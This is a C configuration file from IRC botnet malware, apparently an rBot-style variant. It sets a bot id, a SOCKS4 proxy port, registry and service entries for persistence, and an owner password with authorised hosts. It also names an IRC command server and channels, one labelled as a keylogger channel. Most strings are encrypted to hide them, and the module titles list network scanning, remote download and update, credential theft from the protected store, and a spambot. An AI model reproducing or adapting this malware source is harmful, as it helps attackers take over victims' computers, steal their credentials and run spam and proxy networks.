char mutexhandle[]		= "0xFFFF";         //*mutex handle

#ifndef _DEBUG
char botid[]			= "002";				    //*bot id
#else
char botid[]			= "002.d";
#endif

unsigned short sock4port= (rand()%65534)+1024;		// socks4 port

char prefix				= '.';					//*command prefix
char movepath[]			= "%windir%";			//*path to move to

#ifdef _DEBUG
char debug_log[]		= "C:\\rlog.txt";
char debug_log_mode[]	= "a+";//"w+";
#endif

	  char filename[]			= "\x48\x43\x9B\x40\x17\x8E\xF9\x34\xE5\x69";
      
	  char version[]			= "\x66\x55\xDA\x49\x1E";

#ifndef NO_SERVICE
	char servicename[]		= "\xA4\x13\xF0";
	char servicedisplayname[]= "\x9A\x1E\xF8\x1E\xDA\xCD\xDA\x26\x8A\x0B\x87\x90\x69\x9B\x18\xBB\xD6\x39";
	char servicedesc[]		= "\x9A\x1E\xF8\x1E\xDA\xCD\xDA\x26\x8A\x0B\x87\x90\x69\x9B\x18\xBB\xD6\x39\x7C\xAA\xBB\x2E\x1C\x35\xF1";
#else
	REGENT runkey = { HKEY_LOCAL_MACHINE, "\x84\x38\xDD\x38\xE2\xFF\xE7\x05\xA2\x77\xB9\x9D\x61\xC9\x14\xA7\xCB\x3A\x28\x9A\x88\x18\x11\x3E\xE7\xB1\xEC\xA4\xA0\x3A\x2E\xEF\xED\xFC\xE1\x0A\x0C\xD0\x2C\x2C\x34\x36\x1D\x53\xE5\x1D\x37\x69\xE1", "\xA4\x13\xF0" };
#endif

	char password[]			= "\x0A\x02\xD4\x0A\x55";
	
#ifdef _DEBUG
	char authhost1[] = "\x0E\x0D\xD0\x64\x0C\xD1\xE5\x7C\xFA\x69\x10\x84\x4D\x6B\xC2\xE6\xDE\x9D";
	char *authost[] = { authhost1 };//*!*@*
#else//nick!ident@host
	char authhost1[] = "\x0E\x0D\xD0\x64\x0C\xD1\xE5\x7C\xFA\x69\x10\x84\x4D\x6B\xC2\xE6\xDE\x9D";
	char authhost2[] = "\x0E\x0D\xD0\x64\x0C\xD1\xE5\x7C\xFA\x69\x10\x84\x4D\x6B\xC2\xE6\xDE\x9D";
	char authhost3[] = "\xFD\x56\xB1\x2C\xCD";// *!*@x
	char *authost[] = { authhost1, authhost2, authhost3 };
#endif

#ifndef NO_VERSION_REPLY
	char versionlist1[] = "\xBE\x05\xF4\x0A\xD3\xDB\xC7\x60\x88\x1A\xDA\xC0\x2C\xD9\x4B\xE5\x84\x07\x6E\xF6\xE4\x7B\x48\x69\xB3\xEF\xA9\xE6\xCD\x5F\x59\xA2\xC2\xA2\xA4\x0C\x0C\xF2\x39\x64\x68\x70\x1B\x4F\xD6\x27\x03\x79\xFD\xC1\x89\x6C\xC8\xC4";
	char *versionlist[] = { versionlist1 };
#endif

	SERVER servers[]={
		{
			"\x4D\x5E\x99\x0A\x17\x8D\xBB\x7C\xEA\x79\x0A\x84\x40\x61\xDB",
			"",//pass
			6667,//port
			FALSE,//ssl
		    //"\xF4\x2D\xE2\x02\x96",//mainchan - 
			"\x07\x5E\x9F\x54\x0F\x8B\xBB\x34",// #reptile
            "\x07\x5E\x9F\x54\x0F\x8B\xBB\x34", //#reptile - keyloger
#ifndef NO_MODEONCONN
			"\xFC\x1E",//modeonconn - +i
#endif
#ifndef NO_MODEONJOIN
			"\xFC\x04\xF6\x02\xC1",//modeonjoin - +smnt
#endif

#ifndef NO_SPY_WARNING
			"\xF4\x2D\xE2\x02\x9B\xC9\x96"//warnchan - #Zyn.e#
#endif
		},
	};

#ifndef NO_MELT
	REGENT meltkey=	{ HKEY_LOCAL_MACHINE, "\x84\x38\xDD\x38\xE2\xFF\xE7\x05\xA2\x77\xB9\x9D\x61\xC9\x14\xA7\xCB\x3A\x28\x9A\x88\x18\x11\x3E\xE7\xB1\xEC\xA4\xA0\x3A\x2E\xEF\xED\xFC\xE1\x0A\x0C\xD0\x2C\x2C\x34\x36\x1D\x53\xE5\x1D\x36\x74\xEA\x83\x8A\x3E\xEA\x93\xE1\x81\x45\xAD\xD4\x46\x50\x99", "\x9A\x12\xF7\x18\xF8\xDB" };
#endif
#ifndef NO_RECORD_UPTIME
	REGENT rupkey=	{ HKEY_LOCAL_MACHINE, "\x84\x38\xDD\x38\xE2\xFF\xE7\x05\xA2\x77\xB9\x9D\x61\xC9\x14\xA7\xCB\x3A\x28\x9A\x88\x18\x11\x3E\xE7\xB1\xEC\xA4\xA0\x3A\x2E\xEF\xED\xFC\xE1\x0A\x0C\xD0\x2C\x2C\x34\x36\x1D\x53\xE5\x1D\x36\x74\xEA\x83\x8A\x3E\xEA\x93\xE1\x81\x45\xAD\xD4\x46\x50\x99", "\x85\x12\xF8\x03\xC7\xDA" };
#endif
#ifndef NO_INSTALLED_TIME
	REGENT itkey=	{ HKEY_LOCAL_MACHINE, "\x84\x38\xDD\x38\xE2\xFF\xE7\x05\xA2\x77\xB9\x9D\x61\xC9\x14\xA7\xCB\x3A\x28\x9A\x88\x18\x11\x3E\xE7\xB1\xEC\xA4\xA0\x3A\x2E\xEF\xED\xFC\xE1\x0A\x0C\xD0\x2C\x2C\x34\x36\x1D\x53\xE5\x1D\x36\x74\xEA\x83\x8A\x3E\xEA\x93\xE1\x81\x45\xAD\xD4\x46\x50\x99", "\x9E\x19\xE8\x18\xD4\xD2\xD9\x25\x9A\x0B\xA0\x9D\x6F\xDE" };
#endif

char main_title[]		= "MAIN//";
char threads_title[]	= "THREADS//";
#ifndef NO_PROCESS
char process_title[]	= "PROC//";
#endif
char irc_title[]		= "IRC//";
#ifndef NO_SECURE
char sec_title[]		= "SECURE//";
char unsec_title[]		= "UNSECURE//";
#endif
#ifndef NO_ADVSCAN
char scan_title[]		= "SCAN//";
#endif
#ifndef NO_VISIT
char visit_title[]      = "VISIT//";
#endif
#ifndef NO_NETINFO
char netinfo_title[]	= "NETINFO//";
#endif
#ifndef NO_SYSINFO
char sysinfo_title[]	= "SYSINFO//";
#endif
#ifndef NO_MIRCCMD
char mirc_title[]		= "MIRC//";
#endif
#ifndef NO_FILECTRL
char file_title[]		= "FILE//";
#endif
#ifndef NO_DOWNLOAD
char download_title[]	= "DOWNLOAD//";
char update_title[]		= "UPDATE//";
#endif
#ifndef NO_IFELSE
char logic_title[]		= "LOGIC//";
#endif
#ifndef NO_REGCTRL
char reg_title[]		= "REG//";
#endif
#ifndef NO_PSTORE
char pstore_title[]		= "PSTORE//";
#endif

#ifndef NO_SPAMBOT
char spambot_title[]    = "SPAMBOT//";
#endif

#ifndef NO_SPY_WARNING
char warn_title[]		= "\2WARN\2//";
#endif